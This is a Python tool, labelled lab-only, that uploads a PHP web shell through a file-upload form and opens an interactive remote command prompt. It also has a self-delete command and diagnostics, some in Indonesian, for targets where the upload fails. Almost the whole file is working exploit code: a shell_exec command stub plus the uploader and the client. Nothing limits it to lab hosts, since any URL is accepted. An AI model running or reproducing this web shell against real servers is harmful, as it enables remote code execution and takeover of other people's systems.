#!/usr/bin/env python3
"""php2shell.py -- LAB ONLY (stdlib only, no pip install).

Uploads a token-gated PHP command stub to *your own* test server and
gives you an interactive prompt.

Any http(s) target is accepted as-is; point the tool at the host you
want to test. Use --resolve / --insecure when needed.

Examples
  Local PHP server:
      php -S 127.0.0.1:8000 -t vulnerable
      python php2shell.py http://127.0.0.1:8000/index.php

  Public VPS you own:
      python php2shell.py http://www.domain-anda.com/index.php

  Own server, reached through an SSH tunnel:
      ssh -N -L 8000:127.0.0.1:80 you@www.myserver.com
      python php2shell.py http://www.myserver.com/index.php --resolve www.myserver.com=127.0.0.1:8000

  Self-signed TLS in the lab:
      ... --resolve lab.example=127.0.0.1:8443 --insecure
"""

from __future__ import annotations

import argparse
import http.client
import ipaddress
import random
import shlex
import socket
import ssl
import string
import sys
import urllib.parse
import uuid

BANNER = """\
[+] php2shell (lab build)
"""


def fail(msg: str) -> "NoReturn":
    print(f"[!] {msg}", file=sys.stderr)
    raise SystemExit(2)


# --------------------------------------------------------------------------
# destination handling
# --------------------------------------------------------------------------

def install_resolve(host: str, ip: str, port: int | None) -> None:
    """Make `host` resolve to `ip` for this process only (like /etc/hosts)."""
    real_getaddrinfo = socket.getaddrinfo

    def patched(h, p, *args, **kwargs):
        name = h.decode() if isinstance(h, bytes) else h
        if name == host:
            return real_getaddrinfo(ip, port or p, *args, **kwargs)
        return real_getaddrinfo(h, p, *args, **kwargs)

    socket.getaddrinfo = patched  # type: ignore[assignment]


def parse_resolve(spec: str) -> tuple[str, str, int | None]:
    """HOST=IP[:PORT] -> (host, ip, port). Maps a hostname to a host that
    can actually be reached (e.g. 127.0.0.1 for a local PHP server / tunnel)."""
    host, sep, dest = spec.partition("=")
    if not sep or not host or not dest:
        fail(f"--resolve wants HOST=IP[:PORT], got {spec!r}")

    port: int | None = None
    try:
        addr = ipaddress.ip_address(dest)
        ip = str(addr)
    except ValueError:
        ip, _, port_s = dest.rpartition(":")
        if not ip or not port_s.isdigit():
            fail(f"bad address in --resolve: {dest!r}")
        port = int(port_s)
        ip = ip.strip("[]")

    return host, ip, port


# --------------------------------------------------------------------------
# plain HTTP (so the tool has no third-party dependencies)
# --------------------------------------------------------------------------

def _connection(
    url: str, timeout: float, insecure: bool
) -> tuple[http.client.HTTPConnection, str]:
    """Build a connection + request target. Fragments are never sent."""
    parts = urllib.parse.urlsplit(url)
    host = parts.hostname
    if host is None:
        fail(f"bad URL: {url!r}")

    port = parts.port or (443 if parts.scheme == "https" else 80)
    target = parts.path or "/"
    if parts.query:
        target += "?" + parts.query

    if parts.scheme == "https":
        context = (
            ssl._create_unverified_context()
            if insecure
            else ssl.create_default_context()
        )
        conn: http.client.HTTPConnection = http.client.HTTPSConnection(
            host, port, timeout=timeout, context=context
        )
    else:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
    return conn, target


def http_post(
    url: str,
    body: bytes,
    content_type: str,
    timeout: float,
    insecure: bool = False,
) -> tuple[int, str]:
    conn, target = _connection(url, timeout, insecure)
    try:
        conn.request(
            "POST",
            target,
            body=body,
            headers={
                "Content-Type": content_type,
                "User-Agent": "php2shell-lab/1.0",
                "Accept": "*/*",
            },
        )
        resp = conn.getresponse()
        data = resp.read()
        return resp.status, data.decode("utf-8", "replace")
    except (OSError, http.client.HTTPException) as exc:
        fail(f"request to {url} failed: {exc}")
    finally:
        conn.close()


def http_get(
    url: str, timeout: float, insecure: bool = False
) -> tuple[int, dict[str, str], str]:
    conn, target = _connection(url, timeout, insecure)
    try:
        conn.request(
            "GET",
            target,
            headers={
                "User-Agent": "php2shell-lab/1.0",
                "Accept": "*/*",
            },
        )
        resp = conn.getresponse()
        data = resp.read()
        headers = {k.lower(): v for k, v in resp.getheaders()}
        return resp.status, headers, data.decode("utf-8", "replace")
    except (OSError, http.client.HTTPException) as exc:
        fail(f"request to {url} failed: {exc}")
    finally:
        conn.close()


def multipart(field: str, filename: str, content: bytes, boundary: str) -> bytes:
    b = boundary.encode()
    return b"".join(
        [
            b"--", b, b"\r\n",
            b'Content-Disposition: form-data; name="', field.encode(),
            b'"; filename="', filename.encode(), b'"\r\n',
            b"Content-Type: application/octet-stream\r\n\r\n",
            content, b"\r\n",
            b"--", b, b"--\r\n",
        ]
    )


# --------------------------------------------------------------------------
# payload
# --------------------------------------------------------------------------

def build_payload(token: str) -> bytes:
    php = f"""<?php
// Lab command stub. Answers 404 and does nothing without the run token.
if ((($_POST['t'] ?? '') !== '{token}')) {{
    http_response_code(404);
    exit;
}}
ignore_user_abort(true);
header('Content-Type: text/plain; charset=utf-8');
$c = (string)($_POST['c'] ?? '');
if ($c === '__selfdestruct__') {{
    @unlink(__FILE__);
    echo "stub removed\\n";
    exit;
}}
if ($c === '') {{
    echo "ready\\n";
    exit;
}}
$out = shell_exec($c . ' 2>&1');
echo $out === null ? '' : $out;
"""
    return php.encode("utf-8")


def dir_of(url: str) -> str:
    parts = urllib.parse.urlsplit(url)
    path = parts.path.rsplit("/", 1)[0] + "/"
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, path, "", ""))


def origin_of(url: str) -> str:
    parts = urllib.parse.urlsplit(url)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, "/", "", ""))


def explain_no_shell(
    endpoint: str,
    shell_url: str,
    stub_status: int,
    stub_text: str,
    timeout: float,
    insecure: bool,
) -> list[str]:
    """Work out *why* the stub did not execute, and say so plainly."""
    lines: list[str] = []

    root_url = origin_of(endpoint)
    try:
        _, root_headers, root_text = http_get(root_url, timeout, insecure)
    except SystemExit:
        return [
            "[i] Tidak bisa membandingkan dengan halaman utama untuk diagnosis."
        ]

    powered = (root_headers.get("x-powered-by") or "").lower()
    if powered:
        lines.append(f"[i] X-Powered-By: {powered}")

    if root_text.strip() and root_text.strip() == stub_text.strip():
        lines.append(
            f"[i] {shell_url} mengembalikan dokumen yang sama persis dengan "
            f"{root_url}."
        )
        lines.append(
            "[i] Itu SPA fallback: semua path dilayani satu dokumen yang sama, "
            "jadi file yang di-upload tidak pernah dieksekusi."
        )
        if "php" not in powered:
            lines.append(
                "[i] Target ini bukan PHP (mis. Node.js/Express). Upload -> RCE "
                "tidak mungkin di sini; tidak ada shell untuk didapat."
            )
    elif stub_status != 200:
        lines.append(
            f"[i] Stub mengembalikan HTTP {stub_status}, bukan 200. "
            "Kemungkinan file tidak tersimpan di path itu."
        )
    else:
        lines.append(
            "[i] Cek: apakah uploads/ ada & writable, dan apakah PHP "
            "dieksekusi di direktori itu."
        )

    return lines


# --------------------------------------------------------------------------
# main
# --------------------------------------------------------------------------

def main() -> int:
    ap = argparse.ArgumentParser(
        description="Upload a lab command stub and open an interactive prompt.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "examples:\n"
            "  php -S 127.0.0.1:8000 -t vulnerable\n"
            "  python php2shell.py http://127.0.0.1:8000/index.php\n\n"
            "  python php2shell.py http://lab.example/index.php "
            "--resolve lab.example=127.0.0.1:8000\n"
        ),
    )
    ap.add_argument("url", help="URL of the lab upload page")
    ap.add_argument("--field", default="file", help="upload form field (default: file)")
    ap.add_argument("--name", default=None, help="filename to upload (default: random .php)")
    ap.add_argument("--shell-url", default=None, help="override stub URL")
    ap.add_argument(
        "--upload-endpoint",
        default=None,
        metavar="URL",
        help="POST the file here instead of the positional URL",
    )
    ap.add_argument(
        "--upload-only",
        action="store_true",
        help=(
            "upload and report what the target does, never expect a shell "
            "(use for non-PHP targets such as Juice Shop)"
        ),
    )
    ap.add_argument(
        "--profile",
        choices=["juice-shop"],
        default=None,
        help=(
            "target preset: juice-shop uploads to POST /file-upload and "
            "reports the verdict without expecting a shell"
        ),
    )
    ap.add_argument(
        "--resolve",
        metavar="HOST=IP[:PORT]",
        help="send HOST to this address (like a hosts entry)",
    )
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument(
        "--insecure",
        action="store_true",
        help="skip TLS verification (self-signed lab certs only)",
    )
    args = ap.parse_args()

    if args.profile == "juice-shop":
        args.upload_only = True
        if not args.upload_endpoint:
            args.upload_endpoint = origin_of(args.url) + "file-upload"
        args.field = "file"

    print(BANNER, flush=True)

    if args.resolve:
        host, ip, port = parse_resolve(args.resolve)
        install_resolve(host, ip, port)
        shown = f"{ip}:{port}" if port else ip
        print(f"[i] resolve  : {host} -> {shown}")

    stem = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    filename = args.name or f"{stem}.php"
    token = "".join(random.choices(string.ascii_letters + string.digits, k=24))

    endpoint = args.upload_endpoint or args.url
    shell_url = args.shell_url or urllib.parse.urljoin(
        dir_of(endpoint), f"uploads/{filename}"
    )

    print(f"[i] endpoint : {endpoint}")
    print(f"[i] stub     : {shell_url}")

    boundary = "----lab" + uuid.uuid4().hex
    body = multipart(args.field, filename, build_payload(token), boundary)

    status, text = http_post(
        endpoint,
        body,
        f"multipart/form-data; boundary={boundary}",
        args.timeout,
        args.insecure,
    )
    if status >= 400:
        fail(f"upload returned HTTP {status}: {text[:200]}")
    print(f"[+] upload diterima: HTTP {status}")

    status, text = http_post(
        shell_url,
        urllib.parse.urlencode({"t": token, "c": ""}).encode(),
        "application/x-www-form-urlencoded",
        args.timeout,
        args.insecure,
    )

    if status != 200 or "ready" not in text:
        for line in explain_no_shell(
            endpoint, shell_url, status, text, args.timeout, args.insecure
        ):
            print(line)
        if args.upload_only:
            print(
                "[i] Selesai: upload diterima, tapi payload tidak dieksekusi. "
                "Tidak ada shell."
            )
            return 0
        fail(
            "stub did not answer. Pastikan uploads/ ada & writable, dan PHP "
            "dieksekusi di direktori itu."
        )

    print("[+] stub aktif. Perintah shell biasa, 'cd', ':cleanup', atau 'exit'.\n")

    cwd: str | None = None
    removed = False

    def run(command: str) -> str:
        full = (
            f"cd {shlex.quote(cwd)} && ({command})"
            if cwd
            else f"({command})"
        )
        st, out = http_post(
            shell_url,
            urllib.parse.urlencode({"t": token, "c": full}).encode(),
            "application/x-www-form-urlencoded",
            args.timeout,
            args.insecure,
        )
        if st != 200:
            return f"[stub HTTP {st}]"
        return out

    try:
        while True:
            prompt = f"lab:{cwd}$ " if cwd else "lab$ "
            try:
                line = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break

            if not line:
                continue
            if line in ("exit", "quit", ":q"):
                break
            if line in (":help", "help"):
                print(
                    "  <cmd>       jalankan perintah shell\n"
                    "  cd <dir>    pindah direktori (di-track di sisi client)\n"
                    "  :cleanup    hapus stub dari server, lalu keluar\n"
                    "  exit        keluar tanpa menghapus stub\n"
                )
                continue
            if line == ":cleanup":
                st, out = http_post(
                    shell_url,
                    urllib.parse.urlencode(
                        {"t": token, "c": "__selfdestruct__"}
                    ).encode(),
                    "application/x-www-form-urlencoded",
                    args.timeout,
                    args.insecure,
                )
                print(out.strip() or f"[HTTP {st}]")
                removed = True
                break

            if line == "cd" or line.startswith("cd "):
                target = line[3:].strip() or "/"
                out = run(f"cd {shlex.quote(target)} && pwd")
                candidate = out.strip()
                if candidate.startswith("/") and "\n" not in candidate:
                    cwd = candidate
                else:
                    sys.stdout.write(out if out.endswith("\n") else out + "\n")
                continue

            out = run(line)
            if out:
                sys.stdout.write(out if out.endswith("\n") else out + "\n")
                sys.stdout.flush()
    finally:
        if removed:
            print("[i] keluar. Stub sudah dihapus dari server.")
        else:
            print("[i] keluar. Stub masih ada; jalankan ':cleanup' lain kali.")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
